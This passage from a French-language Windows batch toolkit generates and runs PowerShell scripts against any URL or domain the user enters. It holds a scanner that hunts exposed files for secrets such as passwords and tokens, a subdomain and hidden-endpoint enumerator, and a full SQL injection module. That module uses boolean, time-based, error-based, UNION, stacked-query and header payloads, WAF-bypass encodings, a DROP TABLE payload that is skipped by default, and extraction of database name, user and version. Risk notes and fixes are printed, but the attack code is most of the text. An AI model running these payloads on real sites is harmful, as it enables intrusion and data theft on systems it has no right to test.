echo $keywords_secret = @('password','passwd','secret','token','api_key','apikey','private_key','db_pass','smtp_pass','aws_secret','DATABASE_URL','APP_KEY') >> "%EFS%"
echo. >> "%EFS%"
echo foreach ($path in $paths) { >> "%EFS%"
echo    if ($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; exit } >> "%EFS%"
echo    $testUrl = $url + $path >> "%EFS%"
echo    try { >> "%EFS%"
echo        $r = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 6 -ErrorAction Stop -UseBasicParsing -MaximumRedirection 2 >> "%EFS%"
echo        $code = $r.StatusCode >> "%EFS%"
echo        if ($code -eq 200) { >> "%EFS%"
echo            $size = $r.RawContentLength >> "%EFS%"
echo            $snippet = $r.Content.Substring(0, [math]::Min(200, $r.Content.Length)).Replace("`n",' ') >> "%EFS%"
echo            # Detecter si contenu sensible >> "%EFS%"
echo            $hasSensitive = $keywords_secret ^| Where-Object { $r.Content -match $_ } >> "%EFS%"
echo            if ($hasSensitive) { >> "%EFS%"
echo                Write-Host "  [!!!] CRITIQUE : $path ($size bytes)" -f Red >> "%EFS%"
echo                Write-Host "        Mots-cles sensibles detectes : $($hasSensitive -join ', ')" -f Magenta >> "%EFS%"
echo                Write-Host "        Apercu : $($snippet.Substring(0,[math]::Min(120,$snippet.Length)))" -f Yellow >> "%EFS%"
echo            } else { >> "%EFS%"
echo                Write-Host "  [+] ACCESSIBLE : $path ($size bytes)" -f Yellow >> "%EFS%"
echo                Write-Host "      Apercu : $($snippet.Substring(0,[math]::Min(100,$snippet.Length)))" -f DarkGray >> "%EFS%"
echo            } >> "%EFS%"
echo            $found++ >> "%EFS%"
echo        } elseif ($code -eq 403) { >> "%EFS%"
echo            Write-Host "  [~] BLOQUE (403) : $path" -f DarkGray >> "%EFS%"
echo        } >> "%EFS%"
echo    } catch {} >> "%EFS%"
echo } >> "%EFS%"
echo Write-Host "" >> "%EFS%"
echo Write-Host "  Scan termine. $found ressource(s) exposee(s) trouvee(s)." -f Cyan >> "%EFS%"
echo if ($found -gt 0) { >> "%EFS%"
echo    Write-Host "" >> "%EFS%"
echo    Write-Host "  [!] ANALYSE DES RISQUES (Sensible) :" -f Red >> "%EFS%"
echo    Write-Host "  1. Secrets : Les fichiers .env ou wp-config revelent vos passwords DB/API." -f Yellow >> "%EFS%"
echo    Write-Host "  2. Source : Le dossier .git permet de reconstruire TOUT votre code source." -f Yellow >> "%EFS%"
echo    Write-Host "  3. Backups : Les fichiers .sql ou .zip permettent de voler toute votre base." -f Yellow >> "%EFS%"
echo    Write-Host "  CONSEIL : Utilisez un fichier .htaccess ou nginx.conf pour bloquer ces acces." -f Cyan >> "%EFS%"
echo } >> "%EFS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%EFS%"
if exist "%EFS%" del "%EFS%"
echo.
pause
goto net_cyber_menu


:cyber_sqli_blind
cls
echo.
echo  ===========================================================
echo   INJECTION SQL AVANCEE V2 - BLIND + WAF BYPASS + EXTRACTION
echo  ===========================================================
echo   Nouveau : Test via headers HTTP, WAF bypass encodings,
echo   extraction DB name/user/version, stacked queries,
echo   MSSQL/MySQL/PostgreSQL/SQLite/Oracle.
echo  ===========================================================
echo.
echo  Entrez l'URL cible avec parametre (ex: https://site.com/page?id=1)
set "ALEEX_SQLI_URL="
set /p "ALEEX_SQLI_URL=URL : "
if not defined ALEEX_SQLI_URL goto net_cyber_menu

set "SBS=%TEMP%\sqli_blind.ps1"
if exist "%SBS%" del /f /q "%SBS%"

echo $url = $env:ALEEX_SQLI_URL >> "%SBS%"
echo if ($url -notmatch '^^http') { $url = 'http://' + $url } >> "%SBS%"
echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" >> "%SBS%"
echo $vulns = 0 >> "%SBS%"
echo $waf_detected = $false >> "%SBS%"
echo. >> "%SBS%"
echo # Extraire les parametres >> "%SBS%"
echo $uri = [uri]$url >> "%SBS%"
echo $q = $uri.Query.TrimStart('?') >> "%SBS%"
echo $params = $q.Split('^&', [System.StringSplitOptions]::RemoveEmptyEntries) >> "%SBS%"
echo if ($params.Count -eq 0) { Write-Host "  [!] Aucun parametre GET detecte dans l'URL." -f Red; exit } >> "%SBS%"
echo Write-Host "  [i] Parametres detectes : $($params -join ', ')" -f Cyan >> "%SBS%"
echo Write-Host "" >> "%SBS%"
echo. >> "%SBS%"
echo function Inject-Param { >> "%SBS%"
echo    param($baseUrl, $param, $payload) >> "%SBS%"
echo    $key = $param.Split('=')[0] >> "%SBS%"
echo    $encoded = [uri]::EscapeDataString($payload) >> "%SBS%"
echo    return $baseUrl -replace "$key=[^^&]*", "$key=$encoded" >> "%SBS%"
echo } >> "%SBS%"
echo.
echo function Get-Response { >> "%SBS%"
echo    param($testUrl, $headers = @{}) >> "%SBS%"
echo    try { >> "%SBS%"
echo        if ($headers.Count -gt 0) { >> "%SBS%"
echo            $r = Invoke-WebRequest $testUrl -UserAgent $ua -Headers $headers -TimeoutSec 10 -ErrorAction Stop -UseBasicParsing >> "%SBS%"
echo        } else { >> "%SBS%"
echo            $r = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 10 -ErrorAction Stop -UseBasicParsing >> "%SBS%"
echo        } >> "%SBS%"
echo        return @{ Code=$r.StatusCode; Length=$r.RawContentLength; Content=$r.Content } >> "%SBS%"
echo    } catch { return @{ Code=0; Length=0; Content="" } } >> "%SBS%"
echo } >> "%SBS%"
echo. >> "%SBS%"
echo # WAF Detection initiale >> "%SBS%"
echo Write-Host "  [PRE] Detection WAF/IDS..." -f DarkGray >> "%SBS%"
echo $wafPayload = [char]39 + ' OR 1=1--'
echo $wafUrl = Inject-Param $url $params[0] $wafPayload >> "%SBS%"
echo $wafR = Get-Response $wafUrl >> "%SBS%"
echo if ($wafR.Code -in 403,406,419,429,503) { >> "%SBS%"
echo    Write-Host "  [!] WAF/IPS detecte (HTTP $($wafR.Code)) - Utilisation des bypass encodings" -f Yellow >> "%SBS%"
echo    $script:waf_detected = $true >> "%SBS%"
echo } elseif ($wafR.Content -match 'blocked^|forbidden^|not allowed^|firewall^|security^|waf') { >> "%SBS%"
echo    Write-Host "  [!] WAF detecte via message HTML" -f Yellow >> "%SBS%"
echo    $script:waf_detected = $true >> "%SBS%"
echo } else { >> "%SBS%"
echo    Write-Host "  [OK] Pas de WAF detecte en surface" -f Green >> "%SBS%"
echo } >> "%SBS%"
echo. >> "%SBS%"
echo # Payloads WAF bypass si WAF detecte >> "%SBS%"
echo $bypassEncodings = if ($script:waf_detected) { >> "%SBS%"
echo    @( >> "%SBS%"
echo        { param($p) $p },                                          # Normal >> "%SBS%"
echo        { param($p) $p.Replace(' ', '/**/') },                     # Comment bypass >> "%SBS%"
echo        { param($p) $p.Replace(' ', '%%20') },                      # URL encoded space >> "%SBS%"
echo        { param($p) $p.Replace(' ', '+') },                        # Plus space >> "%SBS%"
echo        { param($p) $p.Replace("'", "%%27") },                      # URL encoded quote >> "%SBS%"
echo        { param($p) [uri]::EscapeDataString([uri]::EscapeDataString($p)) } # Double URL encode >> "%SBS%"
echo    ) >> "%SBS%"
echo } else { >> "%SBS%"
echo    @({ param($p) $p }) >> "%SBS%"
echo } >> "%SBS%"
echo.
echo foreach ($param in $params) { >> "%SBS%"
echo    $key = $param.Split('=')[0] >> "%SBS%"
echo    Write-Host "  =============================" -f Cyan >> "%SBS%"
echo    Write-Host "  Parametre : [$key]" -f Cyan >> "%SBS%"
echo    Write-Host "  =============================" -f Cyan >> "%SBS%"
echo. >> "%SBS%"
echo    $base = Get-Response $url >> "%SBS%"
echo    $baseLen = $base.Length >> "%SBS%"
echo    Write-Host "  Baseline : $baseLen bytes (HTTP $($base.Code))" -f Gray >> "%SBS%"
echo. >> "%SBS%"
echo    # TEST 1 : Boolean-based blind avec WAF bypass >> "%SBS%"
echo    Write-Host "  [1/6] Boolean-based blind SQLi..." -f Yellow >> "%SBS%"
echo    $truePayloads  = @( >> "%SBS%"
echo        "1 AND 1=1--", >> "%SBS%"
echo        "1' AND '1'='1'--", >> "%SBS%"
echo        "1 AND 1=1\#", >> "%SBS%"
echo        "1 AND 1=1/*", >> "%SBS%"
echo        "1' AND '1'='1' AND '1'='1", >> "%SBS%"
echo        "1 OR 1=1--", >> "%SBS%"
echo        "1) AND (1=1--", >> "%SBS%"
echo        "1')) AND ((1=1--" >> "%SBS%"
echo    ) >> "%SBS%"
echo    $falsePayloads = @( >> "%SBS%"
echo        "1 AND 1=2--", >> "%SBS%"
echo        "1' AND '1'='2'--", >> "%SBS%"
echo        "1 AND 1=2\#", >> "%SBS%"
echo        "1 AND 1=2/*", >> "%SBS%"
echo        "1' AND '1'='2' AND '1'='2", >> "%SBS%"
echo        "1 OR 1=2--", >> "%SBS%"
echo        "1) AND (1=2--", >> "%SBS%"
echo        "1')) AND ((1=2--" >> "%SBS%"
echo    ) >> "%SBS%"
echo    for ($i = 0; $i -lt $truePayloads.Count; $i++) { >> "%SBS%"
echo        foreach ($enc in $bypassEncodings) { >> "%SBS%"
echo            $tPayload = ^& $enc $truePayloads[$i] >> "%SBS%"
echo            $fPayload = ^& $enc $falsePayloads[$i] >> "%SBS%"
echo            $trueUrl  = Inject-Param $url $param $tPayload >> "%SBS%"
echo            $falseUrl = Inject-Param $url $param $fPayload >> "%SBS%"
echo            $trueR  = Get-Response $trueUrl >> "%SBS%"
echo            $falseR = Get-Response $falseUrl >> "%SBS%"
echo            $diff = [math]::Abs($trueR.Length - $falseR.Length) >> "%SBS%"
echo            if ($trueR.Length -eq $baseLen -and $diff -gt 50) { >> "%SBS%"
echo                Write-Host "  [VULN] Boolean-based detectee ! TRUE=$($trueR.Length)b FALSE=$($falseR.Length)b (diff=$diff)" -f Red >> "%SBS%"
echo                Write-Host "         Payload TRUE  : $($truePayloads[$i])" -f Magenta >> "%SBS%"
echo                $vulns++; break >> "%SBS%"
echo            } >> "%SBS%"
echo        } >> "%SBS%"
echo    } >> "%SBS%"
echo. >> "%SBS%"
echo    # TEST 2 : Time-based blind (multi-DB + WAF bypass) >> "%SBS%"
echo    Write-Host "  [2/6] Time-based blind (MySQL/MSSQL/PostgreSQL/SQLite/Oracle)..." -f Yellow >> "%SBS%"
echo    $timePayloads = @( >> "%SBS%"
echo        @{P="1' AND SLEEP(4)--";       DB="MySQL"}, >> "%SBS%"
echo        @{P="1 AND SLEEP(4)--";        DB="MySQL (no quote)"}, >> "%SBS%"
echo        @{P="1; WAITFOR DELAY '0:0:4'--"; DB="MSSQL"}, >> "%SBS%"
echo        @{P="1'; WAITFOR DELAY '0:0:4'--"; DB="MSSQL (quote)"}, >> "%SBS%"
echo        @{P="1' AND pg_sleep(4)--";    DB="PostgreSQL"}, >> "%SBS%"
echo        @{P="1 AND pg_sleep(4)--";     DB="PostgreSQL (no quote)"}, >> "%SBS%"
echo        @{P="1' AND 1=(SELECT 1 FROM (SELECT SLEEP(4))x)--"; DB="MySQL subquery"}, >> "%SBS%"
echo        @{P="1 OR SLEEP(4)--";         DB="MySQL OR"}, >> "%SBS%"
echo        @{P="1' OR SLEEP(4)--";        DB="MySQL OR (quote)"}, >> "%SBS%"
echo        @{P="1 AND 1=1 AND SLEEP(4)--"; DB="MySQL chain"}, >> "%SBS%"
echo        @{P="1'; SELECT SLEEP(4)--";   DB="MySQL stacked"}, >> "%SBS%"
echo        @{P="1'; SELECT pg_sleep(4)--"; DB="PostgreSQL stacked"}, >> "%SBS%"
echo        @{P="1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)--"; DB="Oracle"} >> "%SBS%"
echo    ) >> "%SBS%"
echo    foreach ($tp in $timePayloads) { >> "%SBS%"
echo        foreach ($enc in $bypassEncodings) { >> "%SBS%"
echo            $tPayload = ^& $enc $tp.P >> "%SBS%"
echo            $tUrl = Inject-Param $url $param $tPayload >> "%SBS%"
echo            $start = Get-Date >> "%SBS%"
echo            $null = Get-Response $tUrl >> "%SBS%"
echo            $elapsed = ((Get-Date) - $start).TotalSeconds >> "%SBS%"
echo            if ($elapsed -gt 3.5) { >> "%SBS%"
echo                Write-Host "  [VULN] Time-based detectee ! DB:$($tp.DB) Delai:$([math]::Round($elapsed,1))s" -f Red >> "%SBS%"
echo                Write-Host "         Payload : $($tp.P)" -f Magenta >> "%SBS%"
echo                $vulns++; break >> "%SBS%"
echo            } >> "%SBS%"
echo        } >> "%SBS%"
echo        if ($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; exit } >> "%SBS%"
echo    } >> "%SBS%"
echo. >> "%SBS%"
echo    # TEST 3 : Error-based (multi-DB) >> "%SBS%"
echo    Write-Host "  [3/6] Error-based (MySQL/MSSQL/Oracle/PostgreSQL)..." -f Yellow >> "%SBS%"
echo    $errPayloads = @( >> "%SBS%"
echo        [char]39, [char]34, "1')", "1'--", "1'#", "1''", >> "%SBS%"
echo        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", >> "%SBS%"
echo        "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", >> "%SBS%"
echo        "1; SELECT 1/0--", >> "%SBS%"
echo        "1' AND 1=CONVERT(int,'a')--", >> "%SBS%"
echo        "1' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--", >> "%SBS%"
echo        "1 UNION SELECT NULL,NULL,NULL,NULL,@@version--", >> "%SBS%"
echo        "1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162786271,(SELECT (ELT(1=1,1))),0x71706a7671))s), 8446744073709551610, 8446744073709551610)))--" >> "%SBS%"
echo    ) >> "%SBS%"
echo    $errKeywords = @( >> "%SBS%"
echo        'sql syntax','mysql','sqlite','syntax error','ORA-','PostgreSQL', >> "%SBS%"
echo        'Microsoft OLE','ODBC','JDBC','Warning.*mysqli','You have an error', >> "%SBS%"
echo        'supplied argument','Incorrect syntax','Unclosed quotation', >> "%SBS%"
echo        'quoted string not properly','SQLSTATE','DB Error', >> "%SBS%"
echo        'java.sql.','System.Data.SqlClient','Microsoft Access', >> "%SBS%"
echo        'SQLiteException','Zend_Db','ADODB','pg_query', >> "%SBS%"
echo        'PDOException','DBD::','unterminated quoted string' >> "%SBS%"
echo    ) >> "%SBS%"
echo    foreach ($ep in $errPayloads) { >> "%SBS%"
echo        $eUrl = Inject-Param $url $param $ep >> "%SBS%"
echo        $eR = Get-Response $eUrl >> "%SBS%"
echo        $hit = $errKeywords ^| Where-Object { $eR.Content -match $_ } >> "%SBS%"
echo        if ($hit) { >> "%SBS%"
echo            Write-Host "  [VULN] Error-based detectee ! Mot-cle : $($hit[0])" -f Red >> "%SBS%"
echo            Write-Host "         Payload : $ep" -f Magenta >> "%SBS%"
echo            # Essai d'extraction version >> "%SBS%"
echo            $versionPayloads = @( >> "%SBS%"
echo                "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", >> "%SBS%"
echo                "1' UNION SELECT @@version--", >> "%SBS%"
echo                "1 UNION SELECT @@version,NULL--" >> "%SBS%"
echo            ) >> "%SBS%"
echo            foreach ($vp in $versionPayloads) { >> "%SBS%"
echo                $vUrl = Inject-Param $url $param $vp >> "%SBS%"
echo                $vR = Get-Response $vUrl >> "%SBS%"
echo                if ($vR.Content -match '(\d+\.\d+\.\d+[-\w]*)') { >> "%SBS%"
echo                    Write-Host "  [INFO] Version DB extraite : $($matches[1])" -f Yellow >> "%SBS%"
echo                    break >> "%SBS%"
echo                } >> "%SBS%"
echo            } >> "%SBS%"
echo            $vulns++; break >> "%SBS%"
echo        } >> "%SBS%"
echo    } >> "%SBS%"
echo. >> "%SBS%"
echo    # TEST 4 : UNION-based avec extraction >> "%SBS%"
echo    Write-Host "  [4/6] UNION-based (detection + extraction DB/user)..." -f Yellow >> "%SBS%"
echo    $unionFound = $false >> "%SBS%"
echo    for ($cols = 1; $cols -le 15; $cols++) { >> "%SBS%"
echo        $nulls = ('NULL,' * $cols).TrimEnd(',') >> "%SBS%"
echo        $uPayload = "1 UNION SELECT $nulls--" >> "%SBS%"
echo        $uUrl = Inject-Param $url $param $uPayload >> "%SBS%"
echo        $uR = Get-Response $uUrl >> "%SBS%"
echo        if ($uR.Code -eq 200 -and $uR.Length -ne $baseLen) { >> "%SBS%"
echo            Write-Host "  [VULN] UNION fonctionne avec $cols colonne(s) !" -f Red >> "%SBS%"
echo            $vulns++; $unionFound = $true >> "%SBS%"
echo            # Tentative extraction infos critiques >> "%SBS%"
echo            Write-Host "  Tentative extraction DB name / user / version..." -f DarkGray >> "%SBS%"
echo            $extractPayloads = @( >> "%SBS%"
echo                "1 UNION SELECT $((('database(),' * $cols).TrimEnd(',')))--", >> "%SBS%"
echo                "1 UNION SELECT $((('user(),' * $cols).TrimEnd(',')))--", >> "%SBS%"
echo                "1 UNION SELECT $((('@@version,' * $cols).TrimEnd(',')))--", >> "%SBS%"
echo                "1 UNION SELECT $((('current_database(),' * $cols).TrimEnd(',')))--" >> "%SBS%"
echo            ) >> "%SBS%"
echo            foreach ($ep in $extractPayloads) { >> "%SBS%"
echo                $exUrl = Inject-Param $url $param $ep >> "%SBS%"
echo                $exR = Get-Response $exUrl >> "%SBS%"
echo                if ($exR.Length -ne $baseLen -and $exR.Content.Length -gt 10) { >> "%SBS%"
echo                    $diff_content = $exR.Content -replace $uR.Content, '' -replace '\s+',' ' >> "%SBS%"
echo                    if ($diff_content.Length -gt 3) { >> "%SBS%"
echo                        Write-Host "  [DATA] Donnee extraite (peut contenir nom DB/user) detectee" -f Magenta >> "%SBS%"
echo                        break >> "%SBS%"
echo                    } >> "%SBS%"
echo                } >> "%SBS%"
echo            } >> "%SBS%"
echo            break >> "%SBS%"
echo        } >> "%SBS%"
echo    } >> "%SBS%"
echo    if (-not $unionFound) { Write-Host "  [ ] UNION pas concluant sur ce parametre" -f DarkGray } >> "%SBS%"
echo. >> "%SBS%"
echo    # TEST 5 : Stacked Queries >> "%SBS%"
echo    Write-Host "  [5/6] Stacked Queries (MSSQL/PostgreSQL/MySQL 5.5+)..." -f Yellow >> "%SBS%"
echo    $stackedPayloads = @( >> "%SBS%"
echo        @{P="1; SELECT SLEEP(3)--";     DB="MySQL"}, >> "%SBS%"
echo        @{P="1'; SELECT SLEEP(3)--";    DB="MySQL (quote)"}, >> "%SBS%"
echo        @{P="1; WAITFOR DELAY '0:0:3'--"; DB="MSSQL"}, >> "%SBS%"
echo        @{P="1'; WAITFOR DELAY '0:0:3'--"; DB="MSSQL (quote)"}, >> "%SBS%"
echo        @{P="1; SELECT pg_sleep(3)--";  DB="PostgreSQL"}, >> "%SBS%"
echo        @{P="1; SELECT 1--";            DB="Generic"}, >> "%SBS%"
echo        @{P="1; DROP TABLE IF EXISTS sqlitest--"; DB="Generic destructive (simulee)"} >> "%SBS%"
echo    ) >> "%SBS%"
echo    foreach ($sp in $stackedPayloads) { >> "%SBS%"
echo        if ($sp.DB -match 'destructive') { continue } # Skip destructive in auto mode >> "%SBS%"
echo        $sUrl = Inject-Param $url $param $sp.P >> "%SBS%"
echo        $start = Get-Date >> "%SBS%"
echo        $sR = Get-Response $sUrl >> "%SBS%"
echo        $elapsed = ((Get-Date) - $start).TotalSeconds >> "%SBS%"
echo        if ($elapsed -gt 2.5) { >> "%SBS%"
echo            Write-Host "  [VULN] Stacked Query possible ! DB:$($sp.DB) Delai:$([math]::Round($elapsed,1))s" -f Red >> "%SBS%"
echo            $vulns++; break >> "%SBS%"
echo        } >> "%SBS%"
echo    } >> "%SBS%"
echo. >> "%SBS%"
echo    # TEST 6 : SQLi via headers HTTP >> "%SBS%"
echo    Write-Host "  [6/6] SQLi via headers HTTP (User-Agent, X-Forwarded-For, Referer)..." -f Yellow >> "%SBS%"
echo    $sqliHeaders = @('User-Agent','X-Forwarded-For','X-Forwarded-Host','X-Real-IP','Referer','Accept-Language','Cookie') >> "%SBS%"
echo    $hdrPayloads = @( >> "%SBS%"
echo        ([char]39 + ' OR 1=1--'), >> "%SBS%"
echo        ([char]39 + ' AND SLEEP(3)--'), >> "%SBS%"
echo        "1 UNION SELECT NULL--", >> "%SBS%"
echo        ([char]39 + ') OR ('+[char]39+'1'+[char]39+'='+[char]39+'1') >> "%SBS%"
echo    ) >> "%SBS%"
echo    foreach ($hdr in $sqliHeaders) { >> "%SBS%"
echo        foreach ($hp in $hdrPayloads) { >> "%SBS%"
echo            try { >> "%SBS%"
echo                $hTest = @{$hdr = $hp} >> "%SBS%"
echo                $start = Get-Date >> "%SBS%"
echo                $hR = Invoke-WebRequest $url -Headers $hTest -UserAgent $ua -TimeoutSec 8 -EA SilentlyContinue -UseBasicParsing >> "%SBS%"
echo                $elapsed = ((Get-Date) - $start).TotalSeconds >> "%SBS%"
echo                if ($hR -and ($errKeywords ^| Where-Object { $hR.Content -match $_ })) { >> "%SBS%"
echo                    Write-Host "  [VULN] SQLi error via header $hdr !" -f Red >> "%SBS%"
echo                    $vulns++; break >> "%SBS%"
echo                } >> "%SBS%"
echo                if ($elapsed -gt 2.5) { >> "%SBS%"
echo                    Write-Host "  [VULN] SQLi time-based via header $hdr (delai:$([math]::Round($elapsed,1))s) !" -f Red >> "%SBS%"
echo                    $vulns++; break >> "%SBS%"
echo                } >> "%SBS%"
echo            } catch {} >> "%SBS%"
echo        } >> "%SBS%"
echo    } >> "%SBS%"
echo. >> "%SBS%"
echo } >> "%SBS%"
echo Write-Host "" >> "%SBS%"
echo Write-Host "  ================================================" -f Cyan >> "%SBS%"
echo if ($vulns -gt 0) { >> "%SBS%"
echo    Write-Host "  [!!!] $vulns vulnerabilite(s) SQLi detectee(s) !" -f Red >> "%SBS%"
echo    Write-Host "" >> "%SBS%"
echo    Write-Host "  [!] ANALYSE DES RISQUES (SQLi) :" -f Red >> "%SBS%"
echo    Write-Host "  1. Vol de donnees : Acces complet a la base (users, passwords, CB)." -f Yellow >> "%SBS%"
echo    Write-Host "  2. Prise de controle : Possibilite de modifier les admins ou bypass le login." -f Yellow >> "%SBS%"
echo    Write-Host "  3. RCE (Execute OS) : Risque de prise de controle du serveur via la DB." -f Yellow >> "%SBS%"
echo    Write-Host "" >> "%SBS%"
echo    Write-Host "  Recommandations :" -f Cyan >> "%SBS%"
echo    Write-Host "    1. Utilisez des requetes preparees (Prepared Statements)" -f Green >> "%SBS%"
echo    Write-Host "    2. Validez et echappez toutes les entrees utilisateur" -f Green >> "%SBS%"
echo    Write-Host "    3. Appliquez le principe du moindre privilege sur la DB" -f Green >> "%SBS%"
echo    Write-Host "    4. Activez un WAF (ModSecurity, Cloudflare...)" -f Green >> "%SBS%"
echo } else { >> "%SBS%"
echo    Write-Host "  [OK] Aucune SQLi detectee sur les parametres testes." -f Green >> "%SBS%"
echo    Write-Host "" >> "%SBS%"
echo    Write-Host "  [i] NOTE : Cela ne garantit pas l'absence totale de faille." -f DarkGray >> "%SBS%"
echo    Write-Host "      Utilisez sqlmap pour une analyse en profondeur." -f DarkGray >> "%SBS%"
echo } >> "%SBS%"
echo Write-Host "  ================================================" -f Cyan >> "%SBS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%SBS%"
if exist "%SBS%" del "%SBS%"
echo.
pause
goto net_cyber_menu


:cyber_subdomain_scan
cls
echo.
echo  ===========================================================
echo   SCAN SOUS-DOMAINES ET ENDPOINTS CACHES
echo  ===========================================================
echo   Identifie la surface d'attaque en trouvant
echo   les sous-domaines et API du site cible.
echo.
echo  Entrez le domaine cible (ex: monsite.com)
set "ALEEX_SUBDOM_DOMAIN="
set /p "ALEEX_SUBDOM_DOMAIN=Domaine : "
if not defined ALEEX_SUBDOM_DOMAIN goto net_cyber_menu

set "SSS=%TEMP%\subdomain_scan.ps1"
if exist "%SSS%" del /f /q "%SSS%"

echo $domain = $env:ALEEX_SUBDOM_DOMAIN >> "%SSS%"
echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" >> "%SSS%"
echo $found = 0 >> "%SSS%"
echo. >> "%SSS%"
echo # === PARTIE 1 : Sous-domaines === >> "%SSS%"
echo Write-Host "  [1/2] Scan des sous-domaines courants..." -f Blue >> "%SSS%"
echo $subdomains = @( >> "%SSS%"
echo    'www','mail','smtp','pop','imap','ftp','sftp','ssh', >> "%SSS%"
echo    'dev','test','staging','preprod','prod','demo','beta', >> "%SSS%"
echo    'admin','panel','dashboard','portal','intranet','extranet', >> "%SSS%"
echo    'api','api2','api-v1','api-v2','rest','graphql','ws', >> "%SSS%"
echo    'static','cdn','assets','media','img','images','files', >> "%SSS%"
echo    'docs','wiki','support','help','kb','status','monitor', >> "%SSS%"
echo    'vpn','remote','access','secure','ssl','auth','login', >> "%SSS%"
echo    'git','gitlab','github','jenkins','ci','cd','build','deploy', >> "%SSS%"
echo    'jira','confluence','redmine','trello','slack', >> "%SSS%"
echo    'mysql','pgsql','db','database','redis','mongo','elastic', >> "%SSS%"
echo    'old','backup','archive','legacy','v1','v2','new', >> "%SSS%"
echo    'webmail','mail2','ns1','ns2','mx','mx1','smtp2' >> "%SSS%"
echo ) >> "%SSS%"
echo. >> "%SSS%"
echo foreach ($sub in $subdomains) { >> "%SSS%"
echo    $fqdn = "$sub.$domain" >> "%SSS%"
echo    try { >> "%SSS%"
echo        $resolved = [System.Net.Dns]::GetHostAddresses($fqdn) >> "%SSS%"
echo        if ($resolved) { >> "%SSS%"
echo            $ip = $resolved[0].IPAddressToString >> "%SSS%"
echo            Write-Host "  [+] $fqdn -> $ip" -f Green -NoNewline >> "%SSS%"
echo            # Tenter HTTP/HTTPS >> "%SSS%"
echo            foreach ($scheme in @('https','http')) { >> "%SSS%"
echo                try { >> "%SSS%"
echo                    $r = Invoke-WebRequest "$scheme`://$fqdn" -UserAgent $ua -TimeoutSec 5 -ErrorAction Stop -UseBasicParsing -MaximumRedirection 3 >> "%SSS%"
echo                    Write-Host " [$scheme $($r.StatusCode)]" -f Cyan -NoNewline >> "%SSS%"
echo                    # Detecter technologie >> "%SSS%"
echo                    if ($r.Headers['Server']) { Write-Host " Server:$($r.Headers['Server'])" -f Yellow -NoNewline } >> "%SSS%"
echo                    if ($r.Headers['X-Powered-By']) { Write-Host " Powered:$($r.Headers['X-Powered-By'])" -f Yellow -NoNewline } >> "%SSS%"
echo                    break >> "%SSS%"
echo                } catch {} >> "%SSS%"
echo            } >> "%SSS%"
echo            Write-Host "" >> "%SSS%"
echo            $found++ >> "%SSS%"
echo        } >> "%SSS%"
echo    } catch {} >> "%SSS%"
echo } >> "%SSS%"
echo. >> "%SSS%"
echo # === PARTIE 2 : Endpoints caches === >> "%SSS%"
echo Write-Host "" >> "%SSS%"
echo Write-Host "  [2/2] Scan des endpoints caches sur https://$domain..." -f Blue >> "%SSS%"
echo $endpoints = @( >> "%SSS%"
echo    '/api', '/api/v1', '/api/v2', '/api/v3', >> "%SSS%"
echo    '/swagger', '/swagger-ui', '/swagger-ui.html', '/swagger.json', '/openapi.json', >> "%SSS%"
echo    '/graphql', '/graphiql', '/altair', >> "%SSS%"
echo    '/actuator', '/actuator/health', '/actuator/env', '/actuator/metrics', >> "%SSS%"
echo    '/metrics', '/health', '/status', '/ping', '/version', >> "%SSS%"
echo    '/_profiler', '/debug', '/__debug__', >> "%SSS%"
echo    '/wp-json', '/wp-json/wp/v2/users', >> "%SSS%"
echo    '/api/users', '/api/admin', '/api/config', '/api/debug', >> "%SSS%"
echo    '/console', '/rails/info', '/rails/mailers', >> "%SSS%"
echo    '/telescope', '/horizon', '/nova', '/pulse', >> "%SSS%"
echo    '/.well-known/openid-configuration', '/.well-known/jwks.json' >> "%SSS%"
echo ) >> "%SSS%"
echo. >> "%SSS%"
echo foreach ($ep in $endpoints) { >> "%SSS%"
echo    try { >> "%SSS%"
echo        $epUrl = "https://$domain$ep" >> "%SSS%"
echo        $r = Invoke-WebRequest $epUrl -UserAgent $ua -TimeoutSec 5 -ErrorAction Stop -UseBasicParsing >> "%SSS%"
echo        $ctype = $r.Headers['Content-Type'] >> "%SSS%"
echo        Write-Host "  [+] $ep (HTTP $($r.StatusCode) - $($r.RawContentLength)b - $ctype)" -f Yellow >> "%SSS%"
echo        # Si JSON : afficher un extrait >> "%SSS%"
echo        if ($ctype -match 'json') { >> "%SSS%"
echo            $snippet = $r.Content.Substring(0, [math]::Min(200, $r.Content.Length)) >> "%SSS%"
echo            Write-Host "      JSON: $snippet" -f DarkGray >> "%SSS%"
echo        } >> "%SSS%"
echo        $found++ >> "%SSS%"
echo    } catch {} >> "%SSS%"
echo } >> "%SSS%"
echo. >> "%SSS%"
echo Write-Host "" >> "%SSS%"
echo Write-Host "  Scan termine. $found element(s) trouve(s)." -f Cyan >> "%SSS%"
echo if ($found -gt 0) { >> "%SSS%"
echo    Write-Host "" >> "%SSS%"
echo    Write-Host "  [!] ANALYSE DES RISQUES (Surface d'attaque) :" -f Red >> "%SSS%"
echo    Write-Host "  1. Shadow IT : Des APIs ou tests oublies sont souvent des portes ouvertes." -f Yellow >> "%SSS%"
echo    Write-Host "  2. Empreinte : Revele les versions PHP/Apache, SQL, Cloud, SSH." -f Yellow >> "%SSS%"
echo    Write-Host "  3. Information leakage : Les endpoints JSON revelent souvent des IDs/Usernames." -f Yellow >> "%SSS%"
echo    Write-Host "  CONSEIL : Limitez l'exposition publique et utilisez de l'authentification." -f Cyan >> "%SSS%"
echo } >> "%SSS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%SSS%"
if exist "%SSS%" del "%SSS%"
echo.
pause
goto net_cyber_menu


:cyber_auth_test
cls
